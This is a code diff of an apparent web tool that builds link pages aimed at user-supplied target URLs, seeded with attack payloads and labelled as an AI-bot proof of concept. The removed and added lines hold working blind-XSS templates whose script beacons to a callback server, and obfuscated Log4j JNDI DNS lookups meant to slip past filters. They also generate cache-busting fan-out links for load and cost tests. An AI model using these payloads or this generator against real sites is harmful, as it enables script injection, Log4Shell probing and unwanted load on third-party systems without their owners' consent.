@@ -51,12 +51,12 @@
           <label class="vector-option">
             <input type="radio" name="payload" value="cache-bust" checked>
             <span>Cache-busting fan-out</span>
-            <small>1,000 unique value layouts for crawler and cache-cost tests.</small>
+            <small>Unique values for crawler and cache-cost tests.</small>
           </label>
           <label class="vector-option">
             <input type="radio" name="payload" value="marker">
             <span>Unique-request fan-out</span>
-            <small>1,000 traceable value layouts for controlled fan-out tests.</small>
+            <small>Traceable values for controlled fan-out tests.</small>
           </label>
         </section>
         <section>
@@ -64,17 +64,17 @@
           <label class="vector-option">
             <input type="radio" name="payload" value="blind-xss">
             <span>Blind XSS</span>
-            <small>1,000 callback-only context, event, and beacon combinations.</small>
+            <small>12 curated callback-only context and execution variants.</small>
           </label>
           <label class="vector-option">
             <input type="radio" name="payload" value="log4j-dns">
             <span>Log4j lookup</span>
-            <small>1,000 DNS-only obfuscations; no class loading or commands.</small>
+            <small>10 curated DNS-only lookup variants; no class loading or commands.</small>
           </label>
         </section>
       </div>
     </fieldset>
-    <label>Number of generated links
+    <label>Number of generated links <small id="countHelp">Maximum 1,000 for this vector.</small>
       <input id="count" type="number" min="1" max="1000" value="1000" required>
     </label>
     <label id="callbackField" class="wide" hidden>Callback hostname or URL
@@ -156,76 +156,46 @@
       return new URL(callbackUrl(value)).hostname;
     }
 
-    function fanoutPayload(kind, n, token) {
-      const prefixes = {
-        "marker": ["marker", "trace", "probe", "request", "crawler", "visit", "link", "item", "resource", "poc"],
-        "cache-bust": ["cb", "nocache", "fresh", "bypass", "unique", "version", "cache", "miss", "nonce", "buster"],
-      }[kind];
-      const separators = ["-", ".", "_", "~", "!", "$", ":", "/", ",", ";"];
-      const index = n - 1;
-      const prefix = prefixes[index % 10];
-      const separator = separators[Math.floor(index / 10) % 10];
-      const shape = Math.floor(index / 100) % 10;
-      const numbers = [String(n), String(n).padStart(4, "0"), n.toString(16), n.toString(8), n.toString(2)];
-      const number = numbers[shape % 5];
-      const layouts = [
-        [prefix, token, number], [token, prefix, number],
-        [prefix, number, token], [number, prefix, token],
-        [prefix + token, number], [prefix, token + number],
-        [token, number, prefix], [number, token, prefix],
-        [prefix + number, token], [token, prefix + number],
-      ];
-      return layouts[shape].join(separator);
-    }
+    const payloadLimits = {marker: 1000, "cache-bust": 1000, "blind-xss": 12, "log4j-dns": 10};
+    const blindXssTemplates = [
+      '<img src=x onerror="this.onerror=null;{js}">',
+      '"><img src=x onerror="this.onerror=null;{js}">',
+      "'><img src=x onerror=\"this.onerror=null;{js}\">",
+      '<svg onload="{js}">',
+      '"><svg onload="{js}">',
+      "'><svg onload=\"{js}\">",
+      '</title><svg onload="{js}">',
+      '</textarea><svg onload="{js}">',
+      '</scr' + 'ipt><script>{js}</scr' + 'ipt>',
+      '<details open ontoggle="{js}">',
+      '<input autofocus onfocus="{js}">',
+      '<video src=x onerror="this.onerror=null;{js}">',
+    ];
+    const log4jDnsTemplates = [
+      "${jndi:dns://{host}/{path}}",
+      "${${lower:J}ndi:dns://{host}/{path}}",
+      "${j${lower:N}di:dns://{host}/{path}}",
+      "${jn${lower:D}i:dns://{host}/{path}}",
+      "${jnd${lower:I}:dns://{host}/{path}}",
+      "${${lower:J}${lower:N}${lower:D}${lower:I}:dns://{host}/{path}}",
+      "${${::-j}${::-n}${::-d}${::-i}:dns://{host}/{path}}",
+      "${j${::-n}di:dns://{host}/{path}}",
+      "${jndi:${lower:D}${lower:N}${lower:S}://{host}/{path}}",
+      "${${::-j}ndi:${::-d}ns://{host}/{path}}",
+    ];
 
     function blindXssPayload(n, beacon) {
-      const prefixes = ['">', "'>", "</title>", "</textarea>", "</scr" + "ipt>"];
-      const elements = [
-        ['<img src=x {event}="this.onerror=null;{js}">', "onerror"],
-        ['<svg {event}="{js}">', "onload"],
-        ['<details open {event}="{js}">', "ontoggle"],
-        ['<video src=x {event}="this.onerror=null;{js}">', "onerror"],
-        ['<input autofocus {event}="{js}">', "onfocus"],
-      ];
-      const beacons = [
-        "fetch('{beacon}',{mode:'no-cors'})",
-        "(new Image).src='{beacon}'",
-        "navigator.sendBeacon('{beacon}')",
-        "location.assign('{beacon}')",
-        "import('{beacon}')",
-      ];
-      const index = n - 1;
-      const prefix = prefixes[index % 5];
-      const [element, eventName] = elements[Math.floor(index / 5) % 5];
-      const javascript = beacons[Math.floor(index / 25) % 5].replace("{beacon}", beacon);
-      const caseMask = Math.floor(index / 125) % 8;
-      const event = Array.from(eventName, (character, position) =>
-        position < 3 && caseMask & (1 << position) ? character.toUpperCase() : character
-      ).join("");
-      return prefix + element.replace("{event}", event).replace("{js}", javascript);
-    }
-
-    function obfuscatedWord(word, index) {
-      const pieces = [];
-      for (const character of word) {
-        const forms = [character, `\${lower:${character.toUpperCase()}}`, `\${::-${character}}`];
-        pieces.push(forms[index % 3]);
-        index = Math.floor(index / 3);
-      }
-      return [pieces.join(""), index];
+      return blindXssTemplates[n - 1].replace("{js}", `(new Image).src='${beacon}'`);
     }
 
     function log4jDnsPayload(n, token, callback) {
-      let index = n - 1;
-      let jndi;
-      [jndi, index] = obfuscatedWord("jndi", index);
-      const [dns] = obfuscatedWord("dns", index);
       const path = `ai-bot-poc-${encodeURIComponent(token)}-${n}`;
-      return `\${${jndi}:${dns}://${callbackHost(callback)}/${path}}`;
+      return log4jDnsTemplates[n - 1].replace("{host}", callbackHost(callback)).replace("{path}", path);
     }
 
     function payloadFor(kind, n, target, token, callback, custom) {
-      if (kind === "marker" || kind === "cache-bust") return fanoutPayload(kind, n, token);
+      if (kind === "marker") return `marker-${token}-${n}`;
+      if (kind === "cache-bust") return `cb-${token}-${n}`;
       if (kind === "blind-xss") {
         const beacon = `${callbackUrl(callback)}/ai-bot-poc/${encodeURIComponent(token)}/${n}`;
         return blindXssPayload(n, beacon);
@@ -247,9 +217,11 @@
 
     function makePage() {
       const targets = byId("targets").value.split(/\r?\n/).map(x => x.trim()).filter(x => x && !x.startsWith("#"));
+      const kind = selectedPayload();
+      const limit = payloadLimits[kind];
       const count = Number(byId("count").value);
       if (!targets.length) throw new Error("Enter at least one target URL.");
-      if (!Number.isInteger(count) || count < 1 || count > 1000) throw new Error("Link count must be between 1 and 1,000.");
+      if (!Number.isInteger(count) || count < 1 || count > limit) throw new Error(`Link count must be between 1 and ${limit} for this vector.`);
 
       targets.forEach(target => {
         const url = new URL(target);
@@ -257,7 +229,6 @@
       });
       const parameter = byId("parameter").value;
       if (!parameter || /[&=?#]/.test(parameter)) throw new Error("Enter a simple query-parameter name.");
-      const kind = selectedPayload();
       const callback = byId("callback").value.trim();
       if ((kind === "blind-xss" || kind === "log4j-dns") && !callback) throw new Error("This payload requires a controlled callback.");
 
@@ -300,6 +271,11 @@
       const needsCallback = ["blind-xss", "log4j-dns"].includes(kind);
       callback.required = needsCallback;
       byId("callbackField").hidden = !needsCallback;
+      const limit = payloadLimits[kind];
+      const count = byId("count");
+      count.max = limit;
+      if (Number(count.value) > limit) count.value = limit;
+      byId("countHelp").textContent = `Maximum ${limit} curated payload${limit === 1 ? "" : "s"} for this vector.`;
     }
 
     byId("payload").addEventListener("change", updatePayloadUi);
